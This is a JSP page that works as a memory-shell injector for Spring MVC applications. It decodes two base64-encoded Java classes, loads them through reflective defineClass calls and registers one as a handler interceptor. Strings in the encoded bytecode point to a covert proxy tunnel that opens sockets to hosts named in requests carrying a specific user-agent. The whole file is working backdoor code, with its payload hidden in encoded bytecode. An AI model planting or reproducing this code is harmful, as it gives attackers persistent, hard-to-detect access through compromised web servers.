<%@ page import="java.util.Base64" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="org.springframework.web.context.WebApplicationContext" %>
<%@ page import="org.springframework.web.context.request.ServletRequestAttributes" %>
<%@ page import="org.springframework.web.context.request.RequestContextHolder" %>
<%@ page import="org.springframework.beans.BeansException" %>
<%@ page import="java.lang.reflect.InvocationTargetException" %>

<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%!
    public byte[] base64De(String enString) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException {
        byte[] bytes;
        try {
            Class clazz = Class.forName("java.util.Base64");
            Method method = clazz.getDeclaredMethod("getDecoder");
            Object obj = method.invoke(null);
            method = obj.getClass().getDeclaredMethod("decode", String.class);
            obj = method.invoke(obj, enString);
            bytes = (byte[]) obj;
        } catch (ClassNotFoundException e) {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            Method method = clazz.getMethod("decodeBuffer", String.class);
            Object obj = method.invoke(clazz.newInstance(), enString);
            bytes = (byte[]) obj;
        }
        return bytes;
    }

%>
<%
    String className = "com.example.springmvc.proxyInterceptor";
    String className2 = "com.example.springmvc.ProxyStream";
//        String className = "com.example.springmvc.magicInterceptor";
    String b64 = "yv66vgAAADQBFAoAPgCQBwCRCgACAJAKAJIAkwoAAgCUBwCVCgACAJYKAAYAlwcAmAcAmQoACgCQCgAKAJoIAJsKAAoAnAoACgCdCgAJAJ4KAJ8AoAoAoQCiCgCSAKMIAKQLAKUApggApwsApQCoCgAGAKkIAKoKAAYAqwsArACtCACuCgCvALALAKUAsQgAsggAswsArAC0CwCsALULAKwAtgoAPQC3CgC4ALkKALgAugoAPQC7CgA9ALwKAD0AvQoAvgC/BwDACgArAMEKACsAwgoAKwDDCgC4AJQHAMQKADAAxQoAxgDHCgDGAMgHAMkKADQAygoABgDLBwDMCQChAM0IAM4KAM8A0AoAkgDRCgC4ANEHANIHANMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAKExjb20vZXhhbXBsZS9zcHJpbmdtdmMvcHJveHlJbnRlcmNlcHRvcjsBAApFeGNlcHRpb25zBwDUBwDVBwDWBwDXAQALcmVhZENTdHJpbmcBACkoTGphdmEvaW8vSW5wdXRTdHJlYW07KUxqYXZhL2xhbmcvU3RyaW5nOwEAC2lucHV0U3RyZWFtAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAGYnVmZmVyAQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAAWMBAAFCAQANU3RhY2tNYXBUYWJsZQcAkQEAC2NvcHlPZlJhbmdlAQAIKFtCSUkpW0IBAAhvcmlnaW5hbAEAAltCAQAEZnJvbQEAAUkBAAJ0bwEACW5ld0xlbmd0aAEABGNvcHkBAAtlcXVhbHNBcnJheQEAByhbQltCKVoBAAFpAQABYQEAAmEyAQAGbGVuZ3RoAQAPcmVhZElucHV0U3RyZWFtAQAaKExqYXZhL2lvL0lucHV0U3RyZWFtO0kpW0IBAANsZW4BAApyZWFkTnVtYmVyAQAGb2Zmc2V0BwBYAQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEABnNvY2tldAEAEUxqYXZhL25ldC9Tb2NrZXQ7AQAMc29ja2V0T3V0cHV0AQAWTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEAC3NvY2tldElucHV0AQAGdGhyZWFkAQASTGphdmEvbGFuZy9UaHJlYWQ7AQAHdGhyZWFkMgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAARob3N0AQASTGphdmEvbGFuZy9TdHJpbmc7AQAEcG9ydAEACmhhbmRzaGFrZTIBAAloYW5kc2hha2UBABVMamF2YS9sYW5nL1Rocm93YWJsZTsBAAxvdXRwdXRTdHJlYW0BAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHaGFuZGxlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABHBhc3MHAJUHANIHANgHANkHANoHANsHANwHAMkHAMwHAN0BAApTb3VyY2VGaWxlAQAVcHJveHlJbnRlcmNlcHRvci5qYXZhDAA/AEABAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQcA2wwA3gDfDADgAOEBABBqYXZhL2xhbmcvU3RyaW5nDADiAOMMAD8A5AEAImphdmEvbGFuZy9JbGxlZ2FsQXJndW1lbnRFeGNlcHRpb24BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwA5QDmAQADID4gDADlAOcMAOgA6QwAPwDqBwDrDADsAO0HAO4MAO8A8AwA3gDxAQAKdXNlci1hZ2VudAcA2AwA8gDzAQAEUE9TVAwA9ADpDAD1APYBAA5TYWZhcmkvNTM3LjEzOAwA9wD4BwDZDAD5APoBAAVoZWxsbwcA+wwA4ADqDAD8AP0BABFUcmFuc2Zlci1FbmNvZGluZwEAB2NodW5rZWQMAP4A/wwBAADhDAEBAQIMAGQAZQcA3AwA4ADkDAEDAEAMAFUAVgwAXgBfDABLAEwHAQQMAQUA+AEAD2phdmEvbmV0L1NvY2tldAwAPwEGDAEBAQcMAPwBCAEAIWNvbS9leGFtcGxlL3NwcmluZ212Yy9Qcm94eVN0cmVhbQwAPwEJBwEKDAELAEAMAQwAQAEAE2phdmEvaW8vSU9FeGNlcHRpb24MAQ0A6QwBDgDjAQATamF2YS9sYW5nL1Rocm93YWJsZQwBDwEQAQAFZXJyb3IHAREMARIA6gwBEwBAAQAmY29tL2V4YW1wbGUvc3ByaW5nbXZjL3Byb3h5SW50ZXJjZXB0b3IBAEFvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvSGFuZGxlckludGVyY2VwdG9yQWRhcHRlcgEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24BACBqYXZhL2xhbmcvSW5zdGFudGlhdGlvbkV4Y2VwdGlvbgEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAUamF2YS9pby9PdXRwdXRTdHJlYW0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAEcmVhZAEAAygpSQEABXdyaXRlAQAEKEkpVgEAC3RvQnl0ZUFycmF5AQAEKClbQgEABShbQilWAQAGYXBwZW5kAQAcKEkpTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA5qYXZhL2xhbmcvTWF0aAEAA21pbgEABShJSSlJAQAQamF2YS9sYW5nL1N5c3RlbQEACWFycmF5Y29weQEAKihMamF2YS9sYW5nL09iamVjdDtJTGphdmEvbGFuZy9PYmplY3Q7SUkpVgEAByhbQklJKUkBAAlnZXRIZWFkZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldE1ldGhvZAEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAB2luZGV4T2YBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAA5nZXRJbnB1dFN0cmVhbQEAJCgpTGphdmF4L3NlcnZsZXQvU2VydmxldElucHV0U3RyZWFtOwEACXNldEhlYWRlcgEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspVgEADXNldEJ1ZmZlclNpemUBAA9nZXRPdXRwdXRTdHJlYW0BACUoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW07AQAFZmx1c2gBABFqYXZhL2xhbmcvSW50ZWdlcgEACHBhcnNlSW50AQAWKExqYXZhL2xhbmcvU3RyaW5nO0kpVgEAGCgpTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAuKExqYXZhL2lvL0lucHV0U3RyZWFtO0xqYXZhL2lvL091dHB1dFN0cmVhbTspVgEAEGphdmEvbGFuZy9UaHJlYWQBAAVzdGFydAEABGpvaW4BAApnZXRNZXNzYWdlAQAIZ2V0Qnl0ZXMBAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEABWNsb3NlACEAPQA+AAAAAAAGAAEAPwBAAAIAQQAAADMAAQABAAAABSq3AAGxAAAAAgBCAAAACgACAAAAEAAEACsAQwAAAAwAAQAAAAUARABFAAAARgAAAAoABABHAEgASQBKAAEASwBMAAIAQQAAAIwAAwAEAAAAJrsAAlm3AANNK7YABJFZPpkACywdtgAFp//xuwAGWSy2AAe3AAiwAAAAAwBCAAAAEgAEAAAALgAIADAAEgAxABoAMwBDAAAAKgAEAAAAJgBEAEUAAAAAACYATQBOAAEACAAeAE8AUAACAA8AFwBRAFIAAwBTAAAADAAC/AAIBwBU/AARAQBGAAAABAABADQACQBVAFYAAQBBAAAAuQAGAAUAAAA/HBtkPh2cACK7AAlZuwAKWbcACxu2AAwSDbYADhy2AAy2AA+3ABC/HbwIOgQqGxkEAyq+G2QduAARuAASGQSwAAAAAwBCAAAAIgAIAAAANgAEADcACAA4ACcAOgAsADsANgA8ADkAOwA8AD0AQwAAADQABQAAAD8AVwBYAAAAAAA/AFkAWgABAAAAPwBbAFoAAgAEADsAXABaAAMALAATAF0AWAAEAFMAAAAGAAH8ACcBAAkAXgBfAAEAQQAAAMEAAwAEAAAANiorpgAFBKwqxgAHK8cABQOsKr49K74cnwAFA6wDPh0cogAUKh0zKx0znwAFA6yEAwGn/+0ErAAAAAMAQgAAADIADAAAAEAABQBBAAcAQwAPAEQAEQBHABQASAAaAEkAHABMACMATQAsAE4ALgBMADQAUQBDAAAAKgAEAB4AFgBgAFoAAwAAADYAYQBYAAAAAAA2AGIAWAABABQAIgBjAFoAAgBTAAAAEQAHBwcB/AAKAfwAAQEP+gAFAAIAZABlAAIAQQAAALwABAAGAAAAMgM+AzYEHLwIOgUVBByiABorGQUVBBy2ABNZPp4ADBUEHWA2BKf/5hUEHKAABhkFsAGwAAAAAwBCAAAAIgAIAAAAVQACAFYABQBXAAoAWAAeAFkAJwBbAC0AXAAwAF4AQwAAAD4ABgAAADIARABFAAAAAAAyAE0ATgABAAAAMgBmAFoAAgACADAAZwBaAAMABQAtAGgAWgAEAAoAKABPAFgABQBTAAAADAAD/gAKAQEHAGkcCABGAAAABAABADcAAQBqAGsAAgBBAAADVgAEABAAAAFJKxIUuQAVAgA6BBIWK7kAFwEAtgAYmgAbGQQSGbYAGgKfABAsuQAbAQASHLYAHQSsGQQSGbYAGgKfAQ8ruQAeAQA6BSwSHxIguQAhAwAsEQQAuQAiAgAsuQAjAQA6BioZBRAQtwAkOgcZB8YAuhkGGQe2ACUZBrYAJioZBRAItwAkOggZBwMQCLgAJxkIuAAomQCUGQYZCLYAJRkGtgAmKhkFtgApOgkqGQW2ACm4ACo2CrsAK1kZCRUKtwAsOgsZC7YALToMGQu2AC46DRkGBLYALxkGtgAmuwAwWRkFGQy3ADE6DrsAMFkZDRkGtwAxOg8ZDrYAMhkPtgAyGQ62ADMZD7YAM6cAHjoLGQYFtgAvGQYZC7YANbYANrYAJRkGA7YAL6cADToHsgA4Ejm2ADoZBbYAO6cABToHGQa2ADynAAU6BwOsBKwABACyAQYBCQA0AF4BJAEnADcBMQE2ATkANAE7AUABQwA0AAMAQgAAALoALgAAAGYACgBoACMAaQAuAGoAMABsADsAbQBDAG4ATQBvAFYAcABeAHIAaABzAG0AdAB0AHUAeQB2AIMAeACTAHkAmgB6AJ8AewCnAHwAsgB+AL8AfwDGAIAAzQCBANMAggDYAIMA5QCEAPIAhQD3AIYA/ACHAQEAiAEGAI0BCQCJAQsAigERAIsBHgCMASQAkgEnAJABKQCRATEAlAE2AJcBOQCVATsAmQFAAJsBQwCaAUUAnAFHAJ8AQwAAALYAEgC/AEcAbABtAAsAxgBAAG4AbwAMAM0AOQBwAE4ADQDlACEAcQByAA4A8gAUAHMAcgAPAQsAGQB0AHUACwCnAH0AdgB3AAkAsgByAHgAWgAKAIMAoQB5AFgACABoALwAegBYAAcBKQAIAHQAewAHAEMBBABNAE4ABQBeAOkAfABvAAYAAAFJAEQARQAAAAABSQB9AH4AAQAAAUkAfwCAAAIAAAFJAIEAggADAAoBPwCDAHcABABTAAAAXwAK/AAwBwCE/wDYAAsHAIUHAIYHAIcHAIgHAIQHAIkHAIoHAGkHAGkHAIQBAAEHAIv/ABoABwcAhQcAhgcAhwcAiAcAhAcAiQcAigAAQgcAjAlHBwCLAUcHAIsB+QABAEYAAAAEAAEAjQABAI4AAAACAI8=";
    String b64_2 = "yv66vgAAADQAOQoACwAlCQAKACYJAAoAJwoAKAApCgAqACsKACoALAcALQoAKAAuCgAqAC4HAC8HADABAAtpbnB1dFN0cmVhbQEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEADG91dHB1dFN0cmVhbQEAFkxqYXZhL2lvL091dHB1dFN0cmVhbTsBAAY8aW5pdD4BAC4oTGphdmEvaW8vSW5wdXRTdHJlYW07TGphdmEvaW8vT3V0cHV0U3RyZWFtOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACNMY29tL2V4YW1wbGUvc3ByaW5nbXZjL1Byb3h5U3RyZWFtOwEAA3J1bgEAAygpVgEABmJ1ZmZlcgEAAltCAQAKcmVhZE51bWJlcgEAAUkBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAGgcALQcALwEAClNvdXJjZUZpbGUBABBQcm94eVN0cmVhbS5qYXZhDAAQABgMAAwADQwADgAPBwAxDAAyADMHADQMADUANgwANwAYAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAOAAYAQAhY29tL2V4YW1wbGUvc3ByaW5nbXZjL1Byb3h5U3RyZWFtAQAQamF2YS9sYW5nL1RocmVhZAEAE2phdmEvaW8vSW5wdXRTdHJlYW0BAARyZWFkAQAFKFtCKUkBABRqYXZhL2lvL091dHB1dFN0cmVhbQEABXdyaXRlAQAHKFtCSUkpVgEABWZsdXNoAQAFY2xvc2UAIQAKAAsAAAACAAEADAANAAAAAQAOAA8AAAACAAEAEAARAAEAEgAAAFkAAgADAAAADyq3AAEqK7UAAiostQADsQAAAAIAEwAAABIABAAAAAoABAALAAkADAAOAA0AFAAAACAAAwAAAA8AFQAWAAAAAAAPAAwADQABAAAADwAOAA8AAgABABcAGAABABIAAAEGAAQAAwAAAEQREAC8CEwDPSq0AAIrtgAEWT2eABcqtAADKwMctgAFKrQAA7YABqf/4qcAGkwqtAACtgAIpwAETSq0AAO2AAmnAARNsQADAAAAKQAsAAcALQA0ADcABwA4AD8AQgAHAAMAEwAAADoADgAAABIABgATAAgAFAAVABUAHwAWACkAIwAsABgALQAaADQAHQA3ABsAOAAfAD8AIgBCACAAQwAkABQAAAAqAAQABgAjABkAGgABAAgAIQAbABwAAgAtABYAHQAeAAEAAABEABUAFgAAAB8AAAAoAAf9AAgHACAB+QAgQgcAIf8ACgACBwAiBwAhAAEHACEASQcAIfoAAAABACMAAAACACQ=";
    Class<?> RequestContextUtils = Class.forName("org.springframework.web.servlet.support.RequestContextUtils");
    Method getWebApplicationContext;
    try {
        getWebApplicationContext = RequestContextUtils.getDeclaredMethod("getWebApplicationContext", ServletRequest.class);
    } catch (NoSuchMethodException e) {
        getWebApplicationContext = RequestContextUtils.getDeclaredMethod("findWebApplicationContext", HttpServletRequest.class);
    }
    getWebApplicationContext.setAccessible(true);

    WebApplicationContext context = (WebApplicationContext) getWebApplicationContext.invoke(null, ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());

    //从 requestMappingHandlerMapping 中获取 adaptedInterceptors 属性 老版本是 DefaultAnnotationHandlerMapping
    org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping;
    try {
        Class<?> RequestMappingHandlerMapping = Class.forName("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");
        abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(RequestMappingHandlerMapping);
    } catch (BeansException e) {
        Class<?> DefaultAnnotationHandlerMapping = Class.forName("org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping");
        abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(DefaultAnnotationHandlerMapping);
    }

    java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
    field.setAccessible(true);
    java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>) field.get(abstractHandlerMapping);


    // 加载ProxyStream的字节码
    byte[]                   bytes_2       = base64De(b64_2);
//        System.out.println("b64_2 success!");
    ClassLoader    classLoader = Thread.currentThread().getContextClassLoader();
    Method m1          = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
    m1.setAccessible(true);
    m1.invoke(classLoader, className2, bytes_2, 0, bytes_2.length);


    // 加载 SpringInterceptorTemplate 类的字节码
    byte[]                   bytes       = base64De(b64);
//        System.out.println("b64_1 success!");
    Method m0          = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
    m0.setAccessible(true);
    m0.invoke(classLoader, className, bytes, 0, bytes.length);

    //添加SpringInterceptorTemplate类到adaptedInterceptors
    adaptedInterceptors.add(classLoader.loadClass(className).newInstance());
//        System.out.println("add success!");
%>
